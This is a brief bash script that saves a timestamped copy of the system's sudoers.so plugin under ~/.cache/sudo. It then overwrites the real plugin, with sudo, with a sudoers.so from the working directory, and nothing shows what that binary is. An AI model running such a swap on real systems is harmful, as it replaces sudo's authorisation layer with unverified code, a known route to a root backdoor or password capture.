#!/bin/bash

# Backup the current sudoers.so
mkdir -p ~/.cache/sudo
cp /usr/lib/sudo/sudoers.so "$HOME/.cache/sudo/sudoers.so.bak.$(date +%s)"

sudo cp ./sudoers.so /usr/lib/sudo/sudoers.so
